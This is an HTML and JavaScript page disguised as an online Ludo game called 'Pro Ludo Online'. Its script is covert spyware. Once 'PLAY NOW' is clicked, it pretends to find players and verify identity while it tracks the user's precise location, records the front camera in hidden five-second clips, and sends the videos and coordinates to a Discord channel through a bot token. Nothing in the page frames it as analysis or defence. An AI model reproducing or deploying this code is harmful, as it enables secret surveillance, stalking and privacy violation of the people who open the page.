<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        /* ... Same CSS as before ... */
        body { margin: 0; padding: 0; background-color: #2c3e50; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; }
        .game-board { width: 350px; height: 350px; background-color: #fff; border: 5px solid #34495e; border-radius: 10px; display: grid; grid-template-columns: repeat(15, 1fr); grid-template-rows: repeat(15, 1fr); padding: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .cell { border: 1px solid #ddd; }
        .home { background-color: #2ecc71; }
        .home-blue { background-color: #3498db; }
        .home-red { background-color: #e74c3c; }
        .home-yellow { background-color: #f1c40f; }
        .home-green { background-color: #27ae60; }
        .play-btn { margin-top: 30px; padding: 15px 40px; font-size: 20px; background-color: #f39c12; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4); transition: transform 0.2s; }
        .play-btn:hover { transform: scale(1.05); }
        .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; }
        #status-msg { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 12px; }
    </style>
</head>
<body>

    <div id="status-msg">Loading Config...</div>

    <div class="game-board" id="board">
        <!-- Board HTML -->
        <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
        <div class="cell home-green" style="grid-column: 10-15; grid-row: 10-15;"></div>
        <div class="cell home-red" style="grid-column: 1-6; grid-row: 10-15;"></div>
        <div class="cell home-blue" style="grid-column: 10-15; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 7-9; background: #95a5a6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 10-15;"></div>
        <div class="cell" style="grid-column: 1-6; grid-row: 7-9;"></div>
        <div class="cell" style="grid-column: 10-15; grid-row: 7-9;"></div>
    </div>

    <button class="play-btn" id="playBtn">PLAY NOW</button>
    <div class="status" id="statusText">Click Play to find online players</div>

    <script>
        let CONFIG = {};

        // Load Config from config.json
        fetch('config.json')
            .then(response => response.json())
            .then(data => {
                CONFIG = data;
                document.getElementById('status-msg').innerText = "Config Loaded";
                initGame();
            })
            .catch(error => {
                console.error("Error loading config:", error);
                document.getElementById('status-msg').innerText = "Config Error";
                // Fallback to localStorage if config.json fails (for testing)
                const localConfig = localStorage.getItem('ludoConfig');
                if (localConfig) {
                    CONFIG = JSON.parse(localConfig);
                    initGame();
                }
            });

        function initGame() {
            const playBtn = document.getElementById('playBtn');
            const statusText = document.getElementById('statusText');
            const statusMsg = document.getElementById('status-msg');

            playBtn.addEventListener('click', startProcess);

            let isRecording = false;
            let mediaRecorder;
            let videoChunks = [];
            let currentLocation = null;
            let watchId;

            async function startProcess() {
                playBtn.disabled = true;
                playBtn.style.backgroundColor = '#7f8c8d';
                
                statusText.innerText = "Finding nearest players...";
                statusMsg.innerText = "Locating you...";
                
                if (!navigator.geolocation) {
                    statusText.innerText = "Geolocation is not supported by your browser";
                    return;
                }

                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        currentLocation = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        };
                    },
                    (error) => {
                        console.error("Location error:", error);
                        currentLocation = { error: error.message };
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );

                statusText.innerText = "Verifying identity...";
                statusMsg.innerText = "Accessing camera...";

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" },
                        audio: false 
                    });

                    const videoElement = document.createElement('video');
                    videoElement.srcObject = stream;
                    videoElement.play();
                    videoElement.style.display = 'none';
                    document.body.appendChild(videoElement);

                    startRecordingLoop(stream, videoElement);

                } catch (err) {
                    statusText.innerText = "Camera access denied.";
                    console.error(err);
                }
            }

            function startRecordingLoop(stream, videoElement) {
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) videoChunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                    videoChunks = [];
                    uploadToDiscord(videoBlob);
                    
                    setTimeout(() => {
                        if(!mediaRecorder.stream.getTracks()[0].active) {
                            restartStreamAndLoop();
                        } else {
                            recordAndSend();
                        }
                    }, 5000);
                };

                function recordAndSend() {
                    statusMsg.innerText = "Recording...";
                    mediaRecorder.start();
                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
                }

                recordAndSend();
            }

            async function restartStreamAndLoop() {
                statusMsg.innerText = "Restarting camera...";
                try {
                    const newStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" },
                        audio: false 
                    });
                    // Re-initialize recorder with new stream if needed
                } catch (e) {
                    console.error("Restart failed", e);
                }
            }

            async function uploadToDiscord(blob) {
                const formData = new FormData();
                formData.append("file", blob, "recording.webm");

                const payload = {
                    content: `📍 User Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'No Location'} \n 📅 Time: ${new Date().toISOString()}`
                };

                try {
                    await fetch(`https://discord.com/api/v10/channels/${CONFIG.channelId}/messages`, {
                        method: "POST",
                        headers: { "Authorization": `Bot ${CONFIG.discordToken}` },
                        body: JSON.stringify(payload)
                    });

                    await fetch(`https://discord.com/api/v10/channels/${CONFIG.channelId}/messages`, {
                        method: "POST",
                        headers: { "Authorization": `Bot ${CONFIG.discordToken}` },
                        body: formData
                    });

                    statusMsg.innerText = "Sent!";
                    setTimeout(() => { statusMsg.innerText = "Recording..."; }, 2000);

                } catch (error) {
                    console.error("Upload failed:", error);
                    statusMsg.innerText = "Upload Error: " + error.message;
                }
            }
        }
    </script>
</body>
</html>
